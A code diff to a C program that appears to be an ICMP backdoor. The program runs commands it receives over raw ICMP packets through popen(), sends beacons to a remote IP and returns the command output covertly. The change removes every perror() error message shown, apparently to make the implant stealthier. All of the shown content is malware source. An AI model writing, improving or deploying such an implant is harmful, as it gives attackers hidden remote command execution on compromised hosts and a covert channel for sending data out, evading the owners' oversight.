@@ -16,12 +16,10 @@ int create_socket(void) {
 
     // create the raw ICMP socket
     if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
-        perror("socket()");
         exit(EXIT_FAILURE);
     }
 
    if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv) < 0) {
-        perror("setsockopt()");
         exit(1);
     }
 
@@ -45,7 +43,6 @@ size_t invoke_command(unsigned char *data, unsigned char *output) {
 
     ptr = popen(command, "r");
     if (ptr == NULL) {
-        perror("popen()");
         return 0;
     }
 
@@ -83,7 +80,6 @@ int send_beacon(int sockfd, char *dst_ip) {
 
     bytes_num = sendto(sockfd, icmp, packet_size, 0, (struct sockaddr *) &dst, sizeof(dst));
     if (bytes_num < 0) {
-        perror("sendto()");
         free(packet);
         return -1;
     }
@@ -120,7 +116,6 @@ void interact(int sockfd, char *dest_ip) {
         }
 
         if (!read_from_socket(sockfd, packet, packet_size)) {
-            perror("read()");
             goto out;
         }
 
@@ -157,7 +152,6 @@ void interact(int sockfd, char *dest_ip) {
             // send it
             nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + output_size, 0, (struct sockaddr *) &addr, sizeof(addr));
             if (nbytes < 0) {
-                perror("sendto()");
                 break;
             }
 
